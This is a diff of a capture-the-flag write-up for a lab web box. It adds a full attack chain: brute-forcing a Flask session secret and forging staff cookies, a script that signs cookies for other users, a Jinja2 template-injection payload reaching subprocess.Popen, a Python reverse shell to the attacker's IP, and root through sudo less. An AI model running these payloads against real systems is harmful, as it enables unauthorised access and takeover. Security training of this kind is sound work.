@@ -2,7 +2,7 @@
 
 Start: 2nd December 2022 - 10:41pm
 
-End:
+End: 6th December 2022 - 1:26pm
 
 Setup
 ```console
@@ -144,53 +144,16 @@ document.cookie = "x-debug-key-v3=038663befb1ad868a62035cf5d685adb";
 ```
 Then I refresh the page to fill in the form with the following details:
 ```
-Email: ryzh3n@apu.com
-Password: test123
-First Name: Lai
-Last Name: Zhen
-Address: apu
-City: KL
-Date of Birth: 08/28/2000
+Email: test@test.com
+Password: test
+First Name: test
+Last Name: test
+Address: test
+City: test
+Date of Birth: 32/22/2333
 ```
 
-Then I proceed to login with the email and password.
-
-```
-email=newadmin@apu.com&password=test123&firstname=Lai&lastname=Zhen&address=apu&city=KL&dob=2000-08-28
-```
-
-JWT before verification:
-```
-eyJlbWFpbCI6InJ5emgzbkBhcHUuY29tIiwiaWQiOjksInN0YWZmIjpmYWxzZSwidmVyaWZpZWQiOmZhbHNlfQ.Y4rT5Q.qEowvC0JO_cA1RjSVdcdlHZL_Js
-```
-
-Base64 encoded of `{"typ":"JWT","alg":"none"}`:
-```
-eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
-```
-
-Prepended JWT header: 
-```
-eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJlbWFpbCI6InJ5emgzbkBhcHUuY29tIiwiaWQiOjksInN0YWZmIjpmYWxzZSwidmVyaWZpZWQiOmZhbHNlfQ.Y4rT5Q.qEowvC0JO_cA1RjSVdcdlHZL_Js
-```
-It logs me out after refreshing the page.
-
-Modified JWT: `"staff":true`
-```
-eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJlbWFpbCI6InJ5emgzbkBhcHUuY29tIiwiaWQiOjksInN0YWZmIjp0cnVlLCJ2ZXJpZmllZCI6dHJ1ZX0.Y4rNKA.yw1fIu2GoaQCHtIBwxKLioJMCFk
-```
-Same, no luck.
-
-JWT after verification:
-```
-eyJlbWFpbCI6InJ5emgzbkBhcHUuY29tIiwiaWQiOjksInN0YWZmIjpmYWxzZSwidmVyaWZpZWQiOnRydWV9.Y4rWHg.Lf_R07r7NCn82Xmcj4G3nZ61MqA
-```
-
-Prepended JWT header after verification:
-```
-eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJlbWFpbCI6InJ5emgzbkBhcHUuY29tIiwiaWQiOjksInN0YWZmIjpmYWxzZSwidmVyaWZpZWQiOnRydWV9.Y4rWHg.Lf_R07r7NCn82Xmcj4G3nZ61MqA
-```
-Still logs me out.
+Then I proceed to login with the email and password. Upon login, we are given a cookie named `session`.
 
 At this point, these are my thoughts:
 1. `/meetings`, but it says we need to be staff to view this page. So i think it should be JWT related.
@@ -202,3 +165,214 @@ MPFPEDWE4$96JF6UF4B$DXEDWE41G49$CVKETPEB$DD3DSPC7ECJUDUPC%ZD3Q5R.C4LE1WE..DF$DWE
   I have no idea what it means. But we are required to upload a photo of `Wizard ID` to verify our account. I uploaded the example photo given and it says im verified, idk how it checks for the photo but the JWT changed abit after verification.
 
 4. In `scheduling a meeting`, I've tried injecting `XSS`, `SSTI` in the `city` parameter, but it is not working.
+
+> So after struggling for a long time, I finally found out that it wasn't a JWT, it is actually a Flask cookie. I'm new to these kind of stuff, but eventually I made my way out.
+
+I followed the steps [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) to exploit the cookie.
+
+Original flask cookie:
+```
+eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpZCI6OSwic3RhZmYiOmZhbHNlLCJ2ZXJpZmllZCI6ZmFsc2V9.Y46zoA.9I8sM1M3FxS8cKtzTOCp5-43qbI
+```
+
+Bruteforce the `secret` of the cookie using `flask-unsign`:
+```console
+$ flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --cookie 'eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpZCI6OSwic3RhZmYiOmZhbHNlLCJ2ZXJpZmllZCI6ZmFsc2V9.Y46zoA.9I8sM1M3FxS8cKtzTOCp5-43qbI' --no-literal-eval
+[*] Session decodes to: {'email': 'test@test.com', 'id': 9, 'staff': False, 'verified': False}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 1261312 attemptsmehunnamaaaa
+b'sss'
+```
+Found secret: `sss`
+
+Then we modify the content of the cookie to:
+```
+{'email': 'test@test.com', 'id': 9, 'staff': True, 'verified': True}
+```
+
+Then we sign the cookie using the `secret`:
+```console
+$ flask-unsign --sign --cookie "{'email': 'test@test.com', 'id': 9, 'staff': True, 'verified': True}" --secret sss
+eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpZCI6OSwic3RhZmYiOnRydWUsInZlcmlmaWVkIjp0cnVlfQ.Y462rg.31MPokG7VDS4PPDKzM8ZSIDE1Yc
+```
+
+Now we have the malicious cookie:
+```
+eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpZCI6OSwic3RhZmYiOnRydWUsInZlcmlmaWVkIjp0cnVlfQ.Y462rg.31MPokG7VDS4PPDKzM8ZSIDE1Yc
+```
+
+Then we can proceed to `/meetings`. I saw a list of user emails, and I saved them into `emails.txt`.
+```
+afredericks@spell_chaser.wiz
+gwilliams@apricus.wiz
+jkeneth@susurrus.wiz
+dmachin@rowan.wiz
+gmulciber@praxis.wiz
+bcallidora@macedon.wiz
+smoore@ourios.wiz
+nburke@phaidros.wiz
+```
+
+I wrote a python script to generate the token for all of the users in `emails.txt`, and then to view their `User Information` in `/app`:
+```python
+#!/usr/bin/python3
+
+import os
+import subprocess
+import requests
+import json
+
+f = open("emails.txt", "r")
+
+emails = f.readlines()
+
+ok_emails = []
+
+for i in emails:
+  if '\n' in i:
+    i = i.rstrip('\n')
+  ok_emails.append(i)
+
+print(ok_emails)
+
+for index,val in enumerate(ok_emails):
+  cmd = "flask-unsign --sign --cookie \"" + "{'email': '" + val + "', 'id': " + str(index+1) + ", 'staff': True, 'verified': True}" + "\" --secret sss"
+  print(cmd)
+  cookie = subprocess.getoutput(cmd)
+  print(cookie + "\n")
+  r = requests.get('http://wandpermit.htb/app', cookies={"session":cookie})
+  print(r.text)
+```
+
+But I didn't see anything useful here.
+
+But then I noticed there's another search form at `/meetings`. The regex requires us to enter something like `user@mail.com`. So I sent the request in Burpsuite to get rid of the regex limitation.
+
+After trying for different kinds of payloads, it was vulnerable to `SSTI`. The payload was `{{7*7}}`. The value `49` was reflected on the page.
+
+## Exploiting the Server Side Template Injection `SSTI`
+
+> I followed the steps [here](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee).
+
+First, I would check for the inherited classes of an object type `string`. The payload will be `{{''.__class__.__mro__}}` (remember to URL encode if required)
+
+Response:
+```
+(&amp;lt;class &amp;#39;str&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;object&amp;#39;&amp;gt;)
+```
+
+It is HTML encoded twice, so after decoding:
+```
+(<class 'str'>, <class 'object'>)
+```
+
+Then we'll have to access to second item `<class 'object'>`, and view its subclasses. The payload will be `{{''.__class__.__mro__[1].__subclasses__()}}`. The response is too long so I won't show it here. But we need to find the index of the subclass we want to access. For our case, we want to execute system commands, so we need to find for subclasses like `subprocess.Popen` or `os.system`.
+
+I copied the response, decoded it and saved it into `subclasses.txt`. Then I wrote a python script to find out the index of the subclass we need.
+```python
+#!/usr/bin/python3
+
+f = open("subclasses.txt", "r")
+
+text = f.read()
+
+text = text.split(', ')
+
+for index,val in enumerate(text):
+  if "subprocess" in val or "system" in val:
+    print(str(index) + " - " + val)
+```
+
+Output:
+```
+396 - <class 'subprocess.CompletedProcess'>
+397 - <class 'subprocess.Popen'>
+```
+
+So `subprocess.Popen` is at index `397`.
+
+Then we can proceed to call the class tailed with its respective arguments:
+```
+{{''.__class__.__mro__[1].__subclasses__()[397]("id",shell=True,stdout=-1).communicate()}}
+```
+
+Response:
+```
+(b'uid=1000(sparkles) gid=1000(sparkles) groups=1000(sparkles)\n', None)
+```
+
+We have achieved RCE! Now we can escalate to a reverse shell.
+
+I grabbed a Python reverse shell from [revshells.com](https://www.revshells.com/) and put it in the payload.
+
+Before actually sending the payload, I have to make sure the box has `python`. I quickly verified by using the `which python` command, but the response was blank, meaning the box does not have python. Then I tried `python3` and I got a response. So we have to change the reverse shell payload from `python` to `python3` in order to work properly.
+
+I then get ready my netcat listener:
+```console
+$ nc -lnvp 9999
+listening on [any] 9999 ...
+```
+
+Send the payload:
+```
+{{''.__class__.__mro__[1].__subclasses__()[397]("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.3\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'",shell=True,stdout=-1).communicate()}}
+```
+
+On my listener:
+```console
+$ nc -lnvp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.255.160] 42210
+$ whoami
+whoami
+sparkles
+$ id
+id
+uid=1000(sparkles) gid=1000(sparkles) groups=1000(sparkles)
+$ bash -i
+bash -i
+sparkles@d08d143f2369:~/app$ 
+```
+
+### We are in as `sparkles@d08d143f2369`.
+
+The ***user flag*** is at `/home/sparkles/user.txt`.
+
+> The hostname reveals that we might be inside a docker. I quickly verified it by viewing the `/` directory, and there was `.dockerenv` file there. We are actually in a docker.
+
+## `sparkles` to `root`
+
+First, I run a sudo check:
+```console
+sparkles@d08d143f2369:~/app$ sudo -l
+sudo -l
+Matching Defaults entries for sparkles on d08d143f2369:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User sparkles may run the following commands on d08d143f2369:
+    (ALL) NOPASSWD: /usr/bin/less
+```
+
+We are able to run `/usr/bin/less` as sudo without password.
+
+[Gtfo.bins](https://gtfobins.github.io/gtfobins/less/) tells that we can perform privilege escalation by abusing `sudo` with `less`.
+
+```console
+sparkles@d08d143f2369:~/app$ sudo /usr/bin/less /etc/profile
+sudo /usr/bin/less /etc/profile
+WARNING: terminal is not fully functional
+/etc/profile  (press RETURN)!/bin/sh
+!//bbiinn//sshh!/bin/sh
+# whoami
+whoami
+root
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+```
+
+### We are now `root`!
+
+> There's no root flag?
